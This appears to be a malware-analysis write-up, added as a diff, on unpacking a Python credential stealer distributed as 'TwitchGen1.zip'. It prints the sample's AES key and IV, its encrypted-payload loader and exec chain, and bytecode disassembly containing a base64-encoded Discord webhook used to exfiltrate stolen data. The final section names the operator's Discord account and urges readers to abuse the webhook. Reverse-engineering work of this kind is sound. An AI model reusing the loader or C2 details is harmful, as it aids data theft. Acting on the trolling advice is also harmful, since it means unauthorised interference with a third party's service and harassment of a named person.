@@ -1,0 +1,267 @@
+<h1 id="a-guide-to-unpacking-twitchgen1zip">A guide to unpacking &#8220;TwitchGen1.zip&#8221;</h1>
+
+<ul>
+<li>MD5: ffda245ac141114c9edbb3e6bb24ef4c</li>
+<li>SHA256: 4f619b404bac1741a88d50d7326ef8d1346c4494e2a88f5ef6c63835363f6be5</li>
+<li>VT Link: https://www.virustotal.com/gui/file/4f619b404bac1741a88d50d7326ef8d1346c4494e2a88f5ef6c63835363f6be5</li>
+<li>Sample download: TODO, will fill in once samples.lj4.uk exists</li>
+</ul>
+
+<h1 id="required-tools">Required tools:</h1>
+
+<ul>
+<li>Python</li>
+<li>Pyinstxtractor https://github.com/extremecoders-re/pyinstxtractor</li>
+<li>Pycdc https://github.com/zrax/pycdc</li>
+<li>Code editor of your choice</li>
+<li>https://pylingual.io/ (optional, makes life much easier though)</li>
+<li>Some python beautifier (optional, you could do it yourself if you like wasting time)</li>
+</ul>
+
+<h1 id="stage-1-unpacking-pyinstaller-executable">Stage 1: Unpacking pyinstaller executable</h1>
+
+<p>Run pyinstxtractor on the TwitchGen.exe file.
+This will create a folder containing a variety of files.
+The files important to us are:</p>
+
+<ul>
+<li>blank.aes : The encrypted payload</li>
+<li><really_messed_up_filename>.pyc : The code which decrypts the blank.aes payload
+Note: I will refer to the decrypter pyc file as &#8220;decrypter.pyc&#8221; from this point onwards</li>
+</ul>
+
+<h1 id="stage-2-decrypting-blankaes">Stage 2: decrypting blank.aes</h1>
+
+<h2 id="dumping-decrypterpyc">Dumping decrypter.pyc</h2>
+
+<p>Running the file through pylingual gave me a very readable output:</p>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Decompiled with PyLingual (https://pylingual.io)</span>
+<span class="c1"># Internal filename: loader-o.py</span>
+<span class="c1"># Bytecode version: 3.11a7e (3495)</span>
+<span class="c1"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">zlib</span>
+<span class="kn">from</span> <span class="nn">pyaes</span> <span class="kn">import</span> <span class="n">AESModeOfOperationGCM</span>
+<span class="kn">from</span> <span class="nn">zipimport</span> <span class="kn">import</span> <span class="n">zipimporter</span>
+<span class="n">zipfile</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">_MEIPASS</span><span class="p">,</span> <span class="s1">&#39;blank.aes&#39;</span><span class="p">)</span>
+<span class="n">module</span> <span class="o">=</span> <span class="s1">&#39;stub-o&#39;</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;zFioLa0jCOKlAusFK+lzwpGZIdFms2TN3JTsfI6fdB4=&#39;</span><span class="p">)</span>
+<span class="n">iv</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;KtHpVglunMf8mJ+j&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">AESModeOfOperationGCM</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">zipfile</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">zipfile</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">zipfile</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
+    <span class="n">zipimporter</span><span class="p">(</span><span class="n">zipfile</span><span class="p">)</span><span class="o">.</span><span class="n">load_module</span><span class="p">(</span><span class="n">module</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>It is also possible to use pycdc to get most of the file:</p>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Source Generated with Decompyle++</span>
+<span class="c1"># File: 72c15a2e-8d31-49dd-8059-8b8333c0a5c6.pyc (Python 3.11)</span>
+
+<span class="n">Unsupported</span> <span class="n">opcode</span><span class="p">:</span> <span class="n">BEFORE_WITH</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">zlib</span>
+<span class="kn">from</span> <span class="nn">pyaes</span> <span class="kn">import</span> <span class="n">AESModeOfOperationGCM</span>
+<span class="kn">from</span> <span class="nn">zipimport</span> <span class="kn">import</span> <span class="n">zipimporter</span>
+<span class="n">zipfile</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">_MEIPASS</span><span class="p">,</span> <span class="s1">&#39;blank.aes&#39;</span><span class="p">)</span>
+<span class="n">module</span> <span class="o">=</span> <span class="s1">&#39;stub-o&#39;</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;zFioLa0jCOKlAusFK+lzwpGZIdFms2TN3JTsfI6fdB4=&#39;</span><span class="p">)</span>
+<span class="n">iv</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;KtHpVglunMf8mJ+j&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">AESModeOfOperationGCM</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+
+<span class="c1"># WARNING: Decompyle incomplete</span>
+</code></pre>
+</div>
+
+<p>pycdas can be used to figure out the rest of this file if you dont have pylingual available.</p>
+
+<h2 id="writing-script-to-decrypt-blankaes">Writing script to decrypt blank.aes</h2>
+
+<p>I used ChatGPT to smush together a script that works acceptably:</p>
+
+<div class="codehilite">
+<pre><span></span><code><span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="kn">import</span> <span class="nn">zlib</span>
+
+<span class="k">def</span> <span class="nf">decrypt_aes_gcm</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
+    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">nonce</span><span class="o">=</span><span class="n">iv</span><span class="p">)</span>
+    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">plaintext</span>
+
+<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">write_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+
+<span class="n">zipfile</span> <span class="o">=</span> <span class="s1">&#39;blank.aes&#39;</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;zFioLa0jCOKlAusFK+lzwpGZIdFms2TN3JTsfI6fdB4=&#39;</span><span class="p">)</span>
+<span class="n">iv</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;KtHpVglunMf8mJ+j&#39;</span><span class="p">)</span>
+
+
+<span class="n">encrypted</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">(</span><span class="n">zipfile</span><span class="p">)</span>
+<span class="n">encrypted</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">encrypted</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+
+<span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt_aes_gcm</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+
+<span class="n">write_file</span><span class="p">(</span><span class="s2">&quot;blank.aes.decrypted.zip&quot;</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>After running this code, a zip file containing the file &#8220;stub-o.pyc&#8221; will be created</p>
+
+<h1 id="stage-3-decompiling-and-deobfuscating-stub-opyc">Stage 3: Decompiling and deobfuscating stub-o.pyc</h1>
+
+<h2 id="decompiling">Decompiling</h2>
+
+<p>I found that pycdc managed to decompile the important bits of stub-o.pyc.
+This results in a large obfuscated python file</p>
+
+<h2 id="deobfuscating">Deobfuscating</h2>
+
+<p>Unfortunately youre going to have to spend a while manually decoding base64 and renaming variables.
+Eventually, you will clean it up to the point where you can clearly see it decompressing the data blob.
+Here is a section of the file when I deobfuscated it (including my own code that i added to dump it to a file):</p>
+
+<div class="codehilite">
+<pre><span></span><code><span class="n">dataBlob</span> <span class="o">=</span> <span class="c1"># Lots of data</span>
+<span class="n">dataBlobList</span> <span class="o">=</span> <span class="n">getattr_obf</span><span class="p">(</span>
+    <span class="n">eval_obf</span><span class="p">(</span>
+        <span class="s2">&quot;__import__(</span><span class="se">\&quot;</span><span class="s2">builtins</span><span class="se">\&quot;</span><span class="s2">)&quot;</span>
+    <span class="p">),</span>
+    <span class="s2">&quot;list&quot;</span>
+<span class="p">)(</span><span class="n">dataBlob</span><span class="p">)</span>
+
+<span class="n">dataBlobDecompressed</span> <span class="o">=</span> <span class="n">getattr_obf</span><span class="p">(</span><span class="n">eval_obf</span><span class="p">(</span><span class="s2">&quot;__import__(</span><span class="se">\&quot;</span><span class="s2">lzma</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">),</span><span class="s2">&quot;decompress&quot;</span><span class="p">,)(</span><span class="n">bytes_obf</span><span class="p">(</span><span class="n">dataBlobList</span><span class="p">))</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;datablob.decompressed.blankOBF.py&quot;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dataBlobDecompressed</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>This results in another obfuscated python file for us to play with</p>
+
+<h1 id="stage-4-deobfuscating-blankobf-obfuscated-code-dumping-malware-source-disassembly">Stage 4: Deobfuscating blankOBF obfuscated code, dumping malware source disassembly</h1>
+
+<h2 id="deobfuscation">Deobfuscation</h2>
+
+<p>The skid was kind enough to leave a comment in this file that states what was used to obfuscate it</p>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Obfuscated using https://github.com/Blank-c/BlankOBF</span>
+</code></pre>
+</div>
+
+<p>This file is pretty easy to deobfuscate compared to the previous one, as its much smaller.
+You should end up with deobfuscated code that looks like this:</p>
+
+<div class="codehilite">
+<pre><span></span><code><span class="n">dataBlob1</span> <span class="o">=</span> <span class="c1"># ...</span>
+<span class="n">dataBlob2</span> <span class="o">=</span> <span class="c1"># ...</span>
+<span class="n">dataBlob3</span> <span class="o">=</span> <span class="c1"># ...</span>
+<span class="n">dataBlob4</span> <span class="o">=</span> <span class="c1"># ...</span>
+<span class="nb">__import__</span><span class="p">(</span><span class="s2">&quot;builtins&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span>
+    <span class="nb">__import__</span><span class="p">(</span><span class="s2">&quot;marshal&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span>
+        <span class="nb">__import__</span><span class="p">(</span><span class="s2">&quot;base64&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span>
+            <span class="nb">__import__</span><span class="p">(</span><span class="s2">&quot;codecs&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">dataBlob3</span><span class="p">,</span><span class="s2">&quot;rot13&quot;</span><span class="p">,)</span>                          
+            <span class="o">+</span> <span class="n">dataBlob4</span>
+            <span class="o">+</span> <span class="n">dataBlob1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+            <span class="o">+</span> <span class="n">dataBlob2</span>
+        <span class="p">)</span>
+    <span class="p">)</span>
+<span class="p">)</span>
+</code></pre>
+</div>
+
+<h2 id="dumping-source-disassembly">Dumping source disassembly</h2>
+
+<p>The deobfuscated file can then easily be modified so that instead of executing the loaded code, it is disassembled and written to a file</p>
+
+<div class="codehilite">
+<pre><span></span><code><span class="n">dataBlob1</span> <span class="o">=</span> <span class="c1"># ...</span>
+<span class="n">dataBlob2</span> <span class="o">=</span> <span class="c1"># ...</span>
+<span class="n">dataBlob3</span> <span class="o">=</span> <span class="c1"># ...</span>
+<span class="n">dataBlob4</span> <span class="o">=</span> <span class="c1"># ...</span>
+<span class="n">dataBlobDecoded</span> <span class="o">=</span> <span class="nb">__import__</span><span class="p">(</span><span class="s2">&quot;base64&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span>
+            <span class="nb">__import__</span><span class="p">(</span><span class="s2">&quot;codecs&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">dataBlob3</span><span class="p">,</span><span class="s2">&quot;rot13&quot;</span><span class="p">,)</span>                          
+            <span class="o">+</span> <span class="n">dataBlob4</span>
+            <span class="o">+</span> <span class="n">dataBlob1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+            <span class="o">+</span> <span class="n">dataBlob2</span>
+        <span class="p">)</span>
+
+<span class="kn">import</span> <span class="nn">marshal</span>
+<span class="kn">import</span> <span class="nn">dis</span>
+<span class="kn">from</span> <span class="nn">contextlib</span> <span class="kn">import</span> <span class="n">redirect_stdout</span>
+
+<span class="k">def</span> <span class="nf">disassemble_and_save</span><span class="p">(</span><span class="n">code_object</span><span class="p">,</span> <span class="n">output_file</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">with</span> <span class="n">redirect_stdout</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+            <span class="n">dis</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">code_object</span><span class="p">)</span>
+
+<span class="n">loadedCode</span> <span class="o">=</span> <span class="n">marshal</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">dataBlobDecoded</span><span class="p">)</span>
+<span class="n">disassemble_and_save</span><span class="p">(</span><span class="n">loadedCode</span><span class="p">,</span> <span class="s2">&quot;datablob.decompressed.deblankOBFuscated.disassembled.txt&quot;</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<h1 id="stage-5-extracting-useful-data-discord-webhook">Stage 5: Extracting useful data (discord webhook)</h1>
+
+<p>At this point, it is possible to gather all kinds of interesting information about the malware.
+Unsurprisingly, by searching various strings that appear in the disassembled code it can be found that this file is all over github, copypasted by skids.
+From this, its possible to see the original source code and see that this is in fact a skiddy stealer.
+The juicy information for us is the discord webhook used to extract stolen data. I found the section of code containing this at line 1178:</p>
+
+<pre><code>Disassembly of &lt;code object Settings at 0x55e16cf9ffe0, file "&lt;string&gt;", line 27&gt;:
+ 27           0 RESUME                   0
+              2 LOAD_NAME                0 (__name__)
+              4 STORE_NAME               1 (__module__)
+              6 LOAD_CONST               0 ('Settings')
+              8 STORE_NAME               2 (__qualname__)
+
+ 29          10 LOAD_CONST               1 (0)
+             12 PUSH_NULL
+             14 LOAD_NAME                3 (base64)
+             16 LOAD_ATTR                4 (b64decode)
+             26 LOAD_CONST               2 ('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTE2NzIwMDEzODgxMzUxMzc4MC8tMnRlblFuTXYwYXpZY2JqWHYxOEdyd0lkeGxNM2hoTXhoNjhVc0JiaXhmNGJOQ0gzNW9lZGI1QTBCbUhsaDljMDh3Ng==')
+             28 PRECALL                  1
+             32 CALL                     1
+             42 LOAD_METHOD              5 (decode)
+             64 PRECALL                  0
+             68 CALL                     0
+             78 BUILD_TUPLE              2
+             80 STORE_NAME               6 (C2)
+</code></pre>
+
+<h1 id="stage-6-troll-the-discord-webhook">Stage 6: Troll the discord webhook</h1>
+
+<p>If the webhook is active, you can get the username/userID of the skid operating this malware.
+I found the following user information:</p>
+
+<ul>
+<li>id: 1130510361536241664</li>
+<li>username: zade1x</li>
+<li>global_name: Zade</li>
+</ul>
+
+<p>You can then use the webhook link to upload anything you want to their discord server :)</p>
